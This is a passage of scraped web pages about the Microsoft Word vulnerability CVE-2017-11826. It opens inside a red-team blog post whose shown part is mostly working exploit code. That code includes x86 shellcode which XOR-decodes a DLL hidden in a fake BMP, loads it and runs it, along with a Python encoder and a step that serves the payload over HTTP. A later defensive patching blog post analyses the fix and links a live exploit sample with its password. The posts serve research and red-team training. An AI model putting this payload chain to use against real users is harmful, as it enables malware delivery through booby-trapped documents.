    ;         mydata.filesize,
    ;         &mydata.nbytes,
    ;         NULL
    ; )
    push dword 0                        ; lpOverlapped
    lea ecx, [ebp + mydata.nbytes]
    push ecx                            ; lpNumberOfBytesRead
    mov ecx, dword [ebp + mydata.filesize]
    push ecx                            ; nNumberOfBytesToRead
    push eax                            ; lpBuffer
    mov eax, dword [ebp + mydata.filehandle]
    push eax                            ; hFile
    push READFILE_HASH
    call dword [ebp + mydata.api_call]

    ; dll = bmp + 58;
    ; for(unsigned int i = 0; i < filesize; i += 4) {
    ;   tmp = * ((DWORD *) &dll[i]);
    ;   tmp ^= 0x1337c0de
    ; }
    mov edi, dword [ebp + mydata.filebuf]
    add edi, 58
    mov ecx, dword [ebp + mydata.filesize]
    sub ecx, 58
    sar ecx, 2
decode_loop:
    xor dword [edi], 0x1337c0de
    add edi, 4
    dec ecx
    jnz decode_loop

    ; SetFilePointer(mydata.filehandle, 0, 0, FILE_BEGIN)
    push dword FILE_BEGIN               ; dwMoveMethod
    push dword 0                        ; lpDistanceToMoveHigh
    push dword 0                        ; lDistanceToMove
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push SETFILEPOINTER_HASH
    call dword [ebp + mydata.api_call]

    ; WriteFile(
    ;     mydata.filehandle,
    ;     mydata.filebuf + 58,
    ;     mydata.filesize - 58,
    ;     &mydata.nbytes,
    ;     NULL
    ; )
    push dword 0                        ; lpOverlapped
    lea eax, [ebp + mydata.nbytes]
    push eax                            ; lpNumberOfBytesWritten
    mov eax, dword [ebp + mydata.filesize]
    sub eax, 58
    push eax                            ; nNumberOfBytesToWrite
    mov eax, dword [ebp + mydata.filebuf]
    add eax, 58
    push eax                            ; lpBuffer
    mov eax, dword [ebp + mydata.filehandle]
    push eax                            ; hFile
    push WRITEFILE_HASH
    call dword [ebp + mydata.api_call]

    ; SetEndOfFile(mydata.filehandle)
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push SETENDOFFILE_HASH
    call dword [ebp + mydata.api_call]

    ; CloseHandle(mydata.filehandle)
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push CLOSEHANDLE_HASH
    call dword [ebp + mydata.api_call]

    ; eax = LoadLibraryA(mydata.down_filename)
    lea eax, [ebp + mydata.down_filename]
    push eax
    push LOADLIBRARY_HASH
    call dword [ebp + mydata.api_call]

    ; eax = GetProcAddress(eax, mydata.apiname)
    lea ebx, [ebp + mydata.apiname]
    push ebx
    push eax
    push GETPROCADDRESS_HASH
    call dword [ebp + mydata.api_call]

    ; eax()
    call eax

    ; ExitProcess()
    push 0
    push EXITPROCESS_HASH
    call dword [ebp + mydata.api_call]
```

We finish the shellcode with a call to ExitProcess(). We assembly it:

```
$ nasm -o pwn.bin pwn.asm
$ ls -la pwn.bin
-rw-r--r-- 1 i i 519 Nov  8 11:36 pwn.bin
```

And then slightly modify our code to load the shellcode:

```
shellcode = open("pwn.bin", "rb").read()
```

Write a simple DLL to just display a message box:

```
#include

int __declspec(dllexport) doit()
{
  HANDLE current_process;
  char modulepath[MAX_PATH] = { 0 };
  char *txt = NULL;

  current_process = GetModuleHandleA(NULL);
  if (NULL != current_process) {
    if (0 != GetModuleFileNameA((HMODULE)current_process, modulepath, MAX_PATH)) {
      txt = modulepath;
    }
  }

  if (NULL == txt) {
    txt = "";
  }

  MessageBoxA(NULL, txt, "Hi from", MB_OK);

  return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
```

And create the fake BMP:

```
import struct
import sys

k = struct.pack("<L", 0x1337c0de)
key = bytearray(k)

if __name__ == '__main__':
  f = open(sys.argv[1], "rb")
  b = bytearray(f.read())
  f.close()

  for i in range(len(b)):
    b[i] = b[i] ^ key[i % len(key)]

  f = open(sys.argv[2], "wb")
  b = ("a" * 58) + b        ; not a bmp huh?
  f.write(b)
  f.close()
```

Start an HTTP server in the folder where we have saved asd.bmp:

```
$ python -m SimpleHTTPServer 8000
```

And finally open the RTF with Word:

[![Pwned](data:image/gif;base64...)

![Pwned](https://www.tarlogic.com/wp-content/uploads/2017/12/pwned_well-300x234.png)](https://www.tarlogic.com/wp-content/uploads/2017/12/pwned_well.png) Pwned
## 0x06 ‚Äì Final words

This kind of exercises and research performed by the Red Team allow to check the robustness of the [hardening methods](https://www.tarlogic.com/operating-system-hardening/) and the effectiveness of the possible anti-APT and [EDR solutions](https://www.tarlogic.com/cybersecurity-glossary/edr/) deployed in out clien‚Äôts machines. Additionally, breaking into corporate networks through this kind of exploitation, simulating an APT, trains the defense team on this kind of security incidents.

Discover our work and¬†[cybersecurity services](https://www.tarlogic.com/cybersecurity-services/)¬†at¬†[www.tarlogic.com](https://www.tarlogic.com/)

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/) -
[Twitter](https://x.com/share?text=Exploiting Word: CVE-2017-11826&url=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/&title=Exploiting Word: CVE-2017-11826&summary=Tarlogic Security's Red Team shows how to exploit the CVE-2017-11826 vulnerabilities that affected MS Office)

##### Related Posts

[![How to generate PHP sessions securely](data:image/gif;base64...)](https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/)
###### [How to generate PHP sessions securely](https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/)

16 - February - 2015

[Read more](https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/)

[![IoT and embedded devices security analysis following OWASP](data:image/gif;base64...)](https://www.tarlogic.com/blog/security-analysis-on-iot-owasp/)
###### [IoT and embedded devices security analysis following OWASP](https://www.tarlogic.com/blog/security-analysis-on-iot-owasp/)

12 - May - 2022
Fran √Ålvarez Wic, Jes√∫s Mar√≠a G√≥mez Moreno, Antonio V√°zquez Blanco

[Read more](https://www.tarlogic.com/blog/security-analysis-on-iot-owasp/)

[![Saifor CVMS Hub 1.3.1 Vulnerability ‚Äì CVE-2018-6792](data:image/gif;base64...)](https://www.tarlogic.com/blog/saifor-cvms-hub-vulnerability-cve-2018-6792/)
###### [Saifor CVMS Hub 1.3.1 Vulnerability ‚Äì CVE-2018-6792](https://www.tarlogic.com/blog/saifor-cvms-hub-vulnerability-cve-2018-6792/)

01 - March - 2018

[Read more](https://www.tarlogic.com/blog/saifor-cvms-hub-vulnerability-cve-2018-6792/)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park V√≠a Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from blog.0patch.com_5463eb81_20250126_040725.html ===


# [0patch Blog](https://blog.0patch.com/)

Security Patching Simplified To The Extreme

## Thursday, November 9, 2017

Posted by

[Mitja Kolsek](https://www.blogger.com/profile/00089863558178974677 "author profile")

on

[November 09, 2017](https://blog.0patch.com/2017/11/0patching-pretty-nasty-microsoft-word.html "permanent link")

### 0patching a Pretty Nasty Microsoft Word Type Confusion Vulnerability (CVE-2017-11826)

by Mitja Kolsek, the 0patch Team

In September 2017, [Qihoo 360 Core Security detected an in-the-wild attack](https://blog.360totalsecurity.com/en/new-office-0day-cve-2017-11826/) that leveraged an Office 0day vulnerability now known as CVE-2017-11826. The attack employed an RTF document with embedded DOCX Word documents, whereby one of them exploited the vulnerability to cause type confusion in the OOXML parser, Microsoft's parser for Office Open XML File Formats. Additional noteworthy analyses of this vulnerability subsequently came from [McAfee](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-microsoft-office-zero-day-exploit-cve-2017-11826-memory-corruption-vulnerability/) and [Kaspersky](https://securelist.com/analyzing-an-exploit-for-%D1%81ve-2017-11826/82869/).

Yang Kang, Ding Maoyin and Song Shenlei of Qihoo 360 Core Security reported this issue to Microsoft, which fixed it in their [October security update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11826).

This vulnerability is particularly easy to exploit, as it only requires the user to open a malicious RTF document in Word (which is the default RTF editor when installed), and isn't mitigated by Word's Protected View. It is actually surprising that it's not getting exploited more widely, as attackers know very well that many organizations need [weeks or months to apply software updates](https://blog.0patch.com/2016/01/bridging-security-update-gap-with-0patch.html).

Once we got the [exploit file](https://drive.google.com/file/d/0B8AlLxKo4rqLQmd1eXpZcVByUGc/view)\* we could start the analysis. We first minimized the exploit file by removing unnecessary payload and effectively turning it into a crash PoC. Turning a working exploit (one that reliably executes malicious code) into a crash case is an important step for us because in contrast to malware analysts, we're not interested in what malware does when it gets control, but only **how** it gets control. Making an exploit crash instead of execute its code generally leads us closer to the vulnerability that gets exploited - and closer to writing a patch for it. It's also easier to test a patch, once you have one, with a simple and quick test case.

\* Exercise caution with this exploit file - it may run malware on your computer. (Password is *aiongnostes1004*.)

**Analysis**

Opening the crash PoC in Word 2010 crashes immediately with a call to an illegal address:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)

This looks like a call to a vtable function, and since we already learned from Kaspersky above that we're dealing with a type confusion issue, it's likely that we're looking at a case of code processing an object of some expected type with the address at ecx+4 supposedly pointing to a valid function, while the object is actually of a different type.

Type confusion flaws are not the easiest kind to patch if you don't have the source code. While the fix is usually in the form "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE", it's not trivial to figure out where the said type resides in the object without looking around the code where else the same type may be used. Once you have that figured out, it's relatively simple to determine the EXPECTED\_TYPE by observing the type value with legitimate test cases and comparing that to the value when you process the PoC. Finding a suitable GET\_OUT\_OF\_HERE location also needs some figuring out: you want the patched code to escape the flaw gracefully without leaving a corrupted state or cutting off some legitimate functionality. So sometimes this can get time consuming - but in this case, we had the official fix so we could peek into what Microsoft did to correct this flaw.

Diffing the patched wwlib.dll with the latest vulnerable one revealed very few changes. In fact, the only noteworthy change was in the exact function containing the above call that crashes. Let's look at the diff:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s640/diff_comments.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s1600/diff_comments.png)

The patched function is on the left, the vulnerable on the right (click the image to magnify). It's easy to see that the patched function introduced a branch before the grey-marked code in the vulnerable function. And it looks exactly like "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE": it starts with a check for a specific value, and if there is no match, execution is diverted to some new code (marked "Safe exit code" above), which avoids the call that crashed.

The only surprise is that instead of seeing a comparison of some type variable with some type constant (usually a small number, resulting from an enum clause in the source code), we see a comparison with a function address:

cmp ds:[eax+0x48], 0x31E94A4A

Note that 0x31E94A4A is actually an address of some function in wwlib.dll, which gets stored to the address pointed to by eax+0x48 a couple of blocks earlier in the same patched function. So what Microsoft's patch seems so do is check the validity of the object not by inspecting its type (perhaps there is no type ID in the structure at all), but by inspecting the address of a function pointed to by the object. Why not - as long as it works. No one in the world knows this code better than Microsoft's developers and if they thought this was the best possible fix, they're probably right.

**Patching**

Without further analysis, we can clone the same logic to the vulnerable code. The only thing we add is the "Exploit Attempt Blocked" dialog in case the object type is found to be incorrect. And here is the result:

**What Do You Do Now?**

We wrote a CVE-2017-11826 micropatch for 32-bit Word 2010's wwlib.dll version 14.0.7182.5000. While it's generally simple, and often fully automatable, to port a micropatch to other module versions, we prefer to do that on demand for now. So if you're running any affected Office version and for any reason can't apply Microsoft's official update (yet) but would like to be protected from this highly exploitable vulnerability, do let us know at support@0patch.com. We'll port the micropatch to your version and make it available for everyone else too.

If you are a security researcher and have a non-public proof-of-concept for some vulnerability, consider either writing a micropatch for it (using [0patch Agent for Developers](https://blog.0patch.com/2017/02/one-step-closer-to-crowdpatching-and.html)) or sharing the PoC with us so we can create a micropatch together. You'll see it's almost as fun to thoroughly break someone's exploit as it is to write one ;)

Cheers!

[@mkolsek](https://twitter.com/mkolsek)

[@0patch](https://twitter.com/0patch)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7114610046316422325&postID=6504981846649496712&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html "Newer Post")

[Older Post](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html "Older Post")

[Home](https://blog.0patch.com/)

Subscribe to:
[Post Comments (Atom)](https://blog.0patch.com/feeds/6504981846649496712/comments/default)

## About 0patch

[0patch](https://0patch.com) (pronounced 'zero patch') is a platform for instantly distributing, applying and removing microscopic binary patches to/from running processes without having to restart these processes (much less reboot the entire computer). Brought to you by [ACROS Security](https://www.acrossecurity.com).

[Follow @0patch](https://twitter.com/0patch)

## Blog Archive

* ‚ñ∫
  [2025](https://blog.0patch.com/2025/)
  (1)
  + ‚ñ∫
    [January](https://blog.0patch.com/2025/01/)
    (1)

* ‚ñ∫
  [2024](https://blog.0patch.com/2024/)
  (23)
  + ‚ñ∫
    [December](https://blog.0patch.com/2024/12/)
    (1)
  + ‚ñ∫
    [November](https://blog.0patch.com/2024/11/)
    (4)
  + ‚ñ∫
    [October](https://blog.0patch.com/2024/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2024/09/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2024/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2024/06/)
    (2)
  + ‚ñ∫
    [May](https://blog.0patch.com/2024/05/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2024/04/)
    (4)
  + ‚ñ∫
    [March](https://blog.0patch.com/2024/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2024/02/)
    (4)
  + ‚ñ∫
    [January](https://blog.0patch.com/2024/01/)
    (1)

* ‚ñ∫
  [2023](https://blog.0patch.com/2023/)
  (26)
  + ‚ñ∫
    [November](https://blog.0patch.com/2023/11/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2023/10/)
    (3)
  + ‚ñ∫
    [September](https://blog.0patch.com/2023/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2023/08/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2023/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2023/06/)
    (5)
  + ‚ñ∫
    [May](https://blog.0patch.com/2023/05/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2023/04/)
    (1)
  + ‚ñ∫
    [March](https://blog.0patch.com/2023/03/)
    (5)
  + ‚ñ∫
    [February](https://blog.0patch.com/2023/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2023/01/)
    (2)

* ‚ñ∫
  [2022](https://blog.0patch.com/2022/)
  (26)
  + ‚ñ∫
    [December](https://blog.0patch.com/2022/12/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2022/10/)
    (6)
  + ‚ñ∫
    [September](https://blog.0patch.com/2022/09/)
    (3)
  + ‚ñ∫
    [August](https://blog.0patch.com/2022/08/)
    (2)
  + ‚ñ∫
    [July](https://blog.0patch.com/2022/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2022/06/)
    (3)
  + ‚ñ∫
    [May](https://blog.0patch.com/2022/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2022/03/)
    (4)
  + ‚ñ∫
    [January](https://blog.0patch.com/2022/01/)
    (1)

* ‚ñ∫
  [2021](https://blog.0patch.com/2021/)
  (23)
  + ‚ñ∫
    [December](https://blog.0patch.com/2021/12/)
    (2)
  + ‚ñ∫
    [November](https://blog.0patch.com/2021/11/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2021/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2021/09/)
    (1)
  + ‚ñ∫
    [August](https://blog.0patch.com/2021/08/)
    (3)
  + ‚ñ∫
    [July](https://blog.0patch.com/2021/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2021/06/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2021/05/)
    (3)
  + ‚ñ∫
    [March](https://blog.0patch.com/2021/03/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2021/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2021/01/)
    (2)

* ‚ñ∫
  [2020](https://blog.0patch.com/2020/)
  (19)
  + ‚ñ∫
    [December](https://blog.0patch.com/2020/12/)
    (2)
  + ‚ñ∫
    [November](https://blog.0patch.com/2020/11/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2020/09/)
    (1)
  + ‚ñ∫
    [August](https://blog.0patch.com/2020/08/)
    (2)
  + ‚ñ∫
    [July](https://blog.0patch.com/2020/07/)
    (3)
  + ‚ñ∫
    [June](https://blog.0patch.com/2020/06/)
    (2)
  + ‚ñ∫
    [May](https://blog.0patch.com/2020/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2020/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2020/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2020/01/)
    (2)

* ‚ñ∫
  [2019](https://blog.0patch.com/2019/)
  (7)
  + ‚ñ∫
    [September](https://blog.0patch.com/2019/09/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2019/06/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2019/04/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2019/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2019/01/)
    (1)

* ‚ñ∫
  [2018](https://blog.0patch.com/2018/)
  (11)
  + ‚ñ∫
    [October](https://blog.0patch.com/2018/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2018/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2018/08/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2018/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2018/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2018/02/)
    (1)
  + ‚ñ∫
    [January](https://blog.0patch.com/2018/01/)
    (2)

* ‚ñº
  [2017](https://blog.0patch.com/2017/)
  (19)
  + ‚ñ∫
    [December](https://blog.0patch.com/2017/12/)
    (1)
  + ‚ñº
    [November](https://blog.0patch.com/2017/11/)
    (4)
    - [Microsoft's Manual Binary Patch For CVE-2017-11882...](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
    - [Did Microsoft Just Manually Patch Their Equation E...](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html)
    - [0patching a Pretty Nasty Microsoft Word Type Confu...](https://blog.0patch.com/2017/11/0patching-pretty-nasty-microsoft-word.html)
    - [Office DDE Exploits and Attack Surface Reduction](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html)
  + ‚ñ∫
    [October](https://blog.0patch.com/2017/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2017/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2017/08/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2017/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2017/06/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2017/05/)
    (1)
  + ‚ñ∫
    [March](https://blog.0patch.com/2017/03/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2017/02/)
    (3)
  + ‚ñ∫
    [January](https://blog.0patch.com/2017/01/)
    (1)

* ‚ñ∫
  [2016](https://blog.0patch.com/2016/)
  (7)
  + ‚ñ∫
    [September](https://blog.0patch.com/2016/09/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2016/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2016/06/)
    (3)
  + ‚ñ∫
    [January](https://blog.0patch.com/2016/01/)
    (2)

## LinkedIn and Google tags

  ![](https://px.ads.linkedin.com/collect/?pid=1234785&fmt=gif)

|  |  |
| --- | --- |

Copyright ACROS Security / 0patch. Powered by [Blogger](https://www.blogger.com).



=== Content from www.linkedin.com_880086e5_20250126_040717.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fwww%2Etarlogic%2Ecom%2Fblog%2Fexploiting-word-cve-2017-11826%2F%26title%3DExploiting)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedIn‚Äôs [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## We‚Äôve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you don‚Äôt see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F%26title%3DExploiting)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=bd46ee01-f6f0-4f82-a559-73be5dffac19&pageInstance=urn:li:page:checkpoint_lg_uasLogin;YgR4eXwkTca51Oqm+CjFHA==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedIn‚Äôs [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

¬© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + ÿßŸÑÿπÿ±ÿ®Ÿäÿ© (Arabic)
  + ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ (Bangla)
  + ƒåe≈°tina (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨ (Greek)
  + **English (English)**
  + Espa√±ol (Spanish)
  + ŸÅÿßÿ±ÿ≥€å (Persian)
  + Suomi (Finnish)
  + Fran√ßais (French)
  + ‡§π‡§ø‡§Ç‡§¶‡•Ä (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + ◊¢◊ë◊®◊ô◊™ (Hebrew)
  + Êó•Êú¨Ë™û (Japanese)
  + ÌïúÍµ≠Ïñ¥ (Korean)
  + ‡§Æ‡§∞‡§æ‡§†‡•Ä (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + ‡®™‡©∞‡®ú‡®æ‡®¨‡©Ä (Punjabi)
  + Polski (Polish)
  + Portugu√™s (Portuguese)
  + Rom√¢nƒÉ (Romanian)
  + –†—É—Å—Å–∫–∏–π (Russian)
  + Svenska (Swedish)
  + ‡∞§‡±Ü‡∞≤‡±Å‡∞ó‡±Å (Telugu)
  + ‡∏†‡∏≤‡∏©‡∏≤‡πÑ‡∏ó‡∏¢ (Thai)
  + Tagalog (Tagalog)
  + T√ºrk√ße (Turkish)
  + –£–∫—Ä–∞—ó–Ω—Å—å–∫–∞ (Ukrainian)
  + Ti·∫øng Vi·ªát (Vietnamese)
  + ÁÆÄ‰Ωì‰∏≠Êñá (Chinese (Simplified))
  + Ê≠£È´î‰∏≠Êñá (Chinese (Traditional))



=== Content from blog.360totalsecurity.com_9d72c9ec_20250126_040732.html ===


[![360 Total Security Blog Logo](//static.ts.360.com/blog/theme/images/blog_logo-cd6ff279.png "360 Total Security Blog Logo")
# Blog](https://blog.360totalsecurity.com/en/)

[Back to 360 Home](//www.360totalsecurity.com)

* [Latest Post](https://blog.360totalsecurity.com/en/)
* [Products](https://blog.360totalsecurity.com/en/category/products/)
* [Company News](https://blog.360totalsecurity.com/en/category/company-news/)
* [Security News](https://blog.360totalsecurity.com/en/category/security-news/)

* [Latest Post](https://blog.360totalsecurity.com/en/)
* [Products](https://blog.360totalsecurity.com/en/category/products/)
* [Company News](https://blog.360totalsecurity.com/en/category/company-news/)
* [Security News](https://blog.360totalsecurity.com/en/category/security-news/)
* [Download](//www.360totalsecurity.com/download-free-antivirus/360-total-security/?referral=QkxPRw.MzgxMg.1737864452)

# New Office 0day attack CVE-2017-11826 recently disclosed by 360

Oct 11, 2017360TS

[Tweet](https://twitter.com/share)

Choose a language
English

[Learn more about 360 Total Security](//www.360totalsecurity.com/en/ "Learn more about 360 Total Security")

